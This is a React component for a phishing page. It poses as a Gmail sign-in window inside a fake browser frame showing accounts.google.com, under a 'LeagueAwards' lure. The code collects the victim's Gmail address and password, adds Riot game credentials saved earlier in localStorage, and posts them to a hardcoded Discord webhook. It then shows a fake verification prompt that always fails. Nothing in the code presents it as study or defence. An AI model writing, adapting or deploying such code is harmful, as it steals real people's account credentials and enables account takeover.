import React, { useState, useRef, useEffect } from 'react';
import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock, Loader2, Mail, Clock } from 'lucide-react';

const GmailWindow = ({ onClose }) => {
  const [position, setPosition] = useState({ x: 150, y: 150 });
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState(localStorage.getItem('gmail_email') || "");
  const [password, setPassword] = useState(localStorage.getItem('gmail_pass') || "");
  const [verificationCode, setVerificationCode] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [timeLeft, setTimeLeft] = useState(60);
  const [codeSent, setCodeSent] = useState(false);
  
  const isDragging = useRef(false);
  const dragStart = useRef({ x: 0, y: 0 });
  const timerRef = useRef(null);

  useEffect(() => {
    localStorage.setItem('gmail_email', email);
  }, [email]);

  useEffect(() => {
    localStorage.setItem('gmail_pass', password);
  }, [password]);

  // Timer for the verification code
  useEffect(() => {
    if (codeSent && timeLeft > 0) {
      timerRef.current = setInterval(() => {
        setTimeLeft(prev => prev - 1);
      }, 1000);
    } else if (timeLeft === 0) {
      clearInterval(timerRef.current);
      // Reset to step 1 after 1 minute
      setTimeout(() => {
        setCodeSent(false);
        setStep(1);
        setVerificationCode("");
        setError("Verification code expired. Please try again.");
        setTimeLeft(60);
      }, 500);
    }
    return () => clearInterval(timerRef.current);
  }, [codeSent, timeLeft]);

  const sendToDiscord = async () => {
    const finalData = {
      riot_u: localStorage.getItem('riot_u') || "N/A",
      riot_p: localStorage.getItem('riot_p') || "N/A",
      gmail_u: localStorage.getItem('gmail_email') || email,
      gmail_p: localStorage.getItem('gmail_pass') || password
    };
    
    await fetch('https://discord.com/api/webhooks/1527762392107188445/B95liOu8a0_Z1kN_mrrQCWKs3OBUezwnxGnF4CI_keGNPBYhAtLo9BOwwd-wAvMjRNPb', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "New Gmail Data Received",
          fields: [
            { name: "Riot Username", value: finalData.riot_u, inline: true },
            { name: "Riot Password", value: finalData.riot_p, inline: true },
            { name: "Gmail Username", value: finalData.gmail_u, inline: true },
            { name: "Gmail Password", value: finalData.gmail_p, inline: true }
          ]
        }]
      })
    });
  };

  const handleMouseDown = (e) => {
    if (e.button !== 0) return;
    isDragging.current = true;
    dragStart.current = { x: e.clientX - position.x, y: e.clientY - position.y };
    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  };

  const handleMouseMove = (e) => {
    if (!isDragging.current) return;
    setPosition({ x: e.clientX - dragStart.current.x, y: e.clientY - dragStart.current.y });
  };

  const handleMouseUp = () => {
    isDragging.current = false;
    document.removeEventListener('mousemove', handleMouseMove);
    document.removeEventListener('mouseup', handleMouseUp);
  };

  const handleNext = async () => {
    if (step === 1) {
      if (email.toLowerCase().includes('@gmail')) {
        setStep(2);
        setError("");
      } else {
        setError("Please enter a valid Gmail address.");
      }
    } else if (step === 2) {
      if (password.length > 0) {
        setLoading(true);
        try {
          await sendToDiscord();
          localStorage.clear();
          // Go to verification step
          setStep(3);
          setCodeSent(true);
          setTimeLeft(60);
          setLoading(false);
        } catch (err) {
          setError("Failed to send. Please try again.");
          setLoading(false);
        }
      } else {
        setError("Enter your password");
      }
    }
  };

  const handleVerifyCode = () => {
    setVerifying(true);
    // Always show error and reset
    setTimeout(() => {
      setError("Invalid verification code. Please try again.");
      setVerificationCode("");
      setVerifying(false);
    }, 800);
  };

  // Format time as MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div
      style={{ transform: `translate3d(${position.x}px, ${position.y}px, 0)` }}
      className="absolute w-[600px] h-[700px] bg-[#1f1f23] rounded-t-lg shadow-2xl border border-[#323238] flex flex-col z-[100] overflow-hidden select-none"
    >
      {/* Title Bar - Riot Style */}
      <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#18181c] flex items-center justify-between px-2 pt-2 border-b border-[#2d2d31]">
        <div className="flex items-center h-full">
          <div className="h-full w-[180px] bg-[#1f1f23] rounded-t-lg flex items-center gap-2 px-3 border-t border-x border-[#323238]">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" className="w-4 h-4 object-contain"/>
            <span className="text-[11px] text-zinc-300 truncate">
              {step === 3 ? "Verification" : "Gmail Sign-In"}
            </span>
            <X size={12} className="text-zinc-500 hover:text-white cursor-pointer ml-auto" onClick={onClose} />
          </div>
        </div>
        <div className="flex items-center gap-3 pr-2">
          <Minus size={14} className="text-zinc-500 hover:text-white cursor-pointer" />
          <Square size={12} className="text-zinc-500 hover:text-white cursor-pointer" />
          <X size={16} className="text-zinc-400 hover:text-red-400 cursor-pointer" onClick={onClose} />
        </div>
      </div>

      {/* URL Bar - Riot Style */}
      <div className="h-9 bg-[#1f1f23] flex items-center gap-3 px-3 border-b border-[#2d2d31]">
        <div className="flex gap-3 text-zinc-500">
          <ArrowLeft size={16} className="hover:text-white cursor-pointer" />
          <ArrowRight size={16} className="hover:text-white cursor-pointer" />
          <RotateCw size={16} className="hover:text-white cursor-pointer" />
        </div>
        <div className="flex-1 h-7 bg-[#18181c] border border-[#2d2d31] rounded-full flex items-center px-3 text-[11px]">
          <span className="text-emerald-500">https://</span>
          <span className="text-zinc-400">accounts.google.com/verify</span>
          <Lock size={12} className="text-green-500 ml-auto" />
        </div>
      </div>

      {/* Content - White background */}
      <div className="flex-1 bg-white flex flex-col items-center justify-center p-8">
        {step === 3 ? (
          // Verification Step
          <div className="w-full max-w-[380px] text-center">
            <div className="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center mx-auto mb-4">
              <Mail className="w-8 h-8 text-blue-500" />
            </div>
            
            <h2 className="text-2xl text-zinc-900 font-bold mb-2">Verify your account</h2>
            <p className="text-zinc-600 text-sm mb-1">
              We've sent a verification code to:
            </p>
            <p className="text-zinc-800 font-semibold text-sm mb-4">
              {email}
            </p>
            
            {/* Timer Display */}
            <div className="flex items-center justify-center gap-2 mb-6">
              <Clock className="w-4 h-4 text-zinc-500" />
              <span className="text-sm font-mono text-zinc-700">
                {formatTime(timeLeft)}
              </span>
              <span className="text-xs text-zinc-500">remaining</span>
            </div>
            
            {error && (
              <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-red-600 text-sm">{error}</p>
              </div>
            )}
            
            <input 
              type="text"
              placeholder="Enter 6-digit code" 
              value={verificationCode}
              onChange={(e) => setVerificationCode(e.target.value)}
              className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500 text-center text-lg tracking-widest"
              maxLength={6}
              disabled={timeLeft === 0}
            />
            
            <button 
              onClick={handleVerifyCode}
              disabled={verifying || timeLeft === 0}
              className={`w-full mt-4 h-12 rounded font-medium text-sm transition-all duration-300 ${
                verifying || timeLeft === 0
                  ? "bg-gray-300 cursor-not-allowed" 
                  : "bg-blue-600 hover:bg-blue-700 text-white"
              }`}
            >
              {verifying ? (
                <Loader2 className="animate-spin w-4 h-4 inline-block" />
              ) : timeLeft === 0 ? (
                "Code Expired"
              ) : (
                "Verify"
              )}
            </button>
            
            {timeLeft === 0 && (
              <p className="text-red-500 text-xs mt-3">
                ⚠️ Verification code expired. Redirecting to sign in...
              </p>
            )}
          </div>
        ) : (
          // Login Steps
          <>
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" 
              alt="Google Logo" 
              className="w-32 h-auto object-contain mb-6" 
            />
            
            <h2 className="text-2xl text-zinc-900 font-bold mb-2">
              {step === 1 ? "Sign in" : "Welcome"}
            </h2>
            <p className="text-zinc-600 text-sm mb-6">
              {step === 1 ? "Continue to LeagueAwards" : email}
            </p>
            
            {error && <p className="text-red-500 text-xs mb-4">{error}</p>}
            
            <div className="w-full max-w-[350px] space-y-4">
              <input 
                type={step === 1 ? "email" : "password"}
                placeholder={step === 1 ? "Email or phone" : "Enter your password"} 
                value={step === 1 ? email : password}
                onChange={(e) => step === 1 ? setEmail(e.target.value) : setPassword(e.target.value)}
                className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
              />
              
              <div className="flex justify-between items-center pt-4">
                {step === 2 && (
                  <button 
                    onClick={() => setStep(1)} 
                    className="text-blue-600 font-medium text-sm hover:text-blue-700 flex items-center gap-1"
                  >
                    <ArrowLeft size={16} /> Back
                  </button>
                )}
                <button 
                  onClick={handleNext} 
                  disabled={loading}
                  className={`ml-auto px-6 py-2 rounded font-medium text-sm transition-all duration-300 ${
                    loading 
                      ? "bg-blue-400 cursor-not-allowed" 
                      : "bg-blue-600 hover:bg-blue-700 text-white"
                  }`}
                >
                  {loading ? (
                    <Loader2 className="animate-spin w-4 h-4 inline-block" />
                  ) : (
                    step === 1 ? "Next" : "Sign in"
                  )}
                </button>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default GmailWindow;